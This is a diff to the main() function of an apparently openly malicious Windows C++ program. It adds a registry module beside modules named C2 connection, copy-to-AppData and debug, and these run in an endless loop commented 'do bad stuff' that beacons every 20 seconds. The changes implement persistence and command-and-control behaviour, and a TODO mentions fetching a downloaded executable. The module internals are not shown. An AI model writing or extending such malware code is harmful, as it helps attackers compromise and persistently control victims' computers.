@@ -6,6 +6,7 @@
 #include "CP.h"
 #include "RM.h"
 #include "DB.h"
+#include "RG.h"
 #include "UTIL.h";
 #include <iostream>
 
@@ -17,8 +18,10 @@ int main()
 	C2 connModule;
 	RM remvModule;
 	DB debgModule;
+	RG regsModule;
+
 	UTIL util;
-	
+
 	if (!util.isExecutingFromAppData()) {
 		copyModule.execute();
 		debgModule.execute();
@@ -27,9 +30,10 @@ int main()
 	}
 
 	//TODO check if downloaded.exe exists before retrieving
-	//TODO modify registry keys
+
 	while (true) {
 		// do bad stuff
+		regsModule.execute();
 		debgModule.execute();
 		connModule.execute();
 		Sleep(20000);
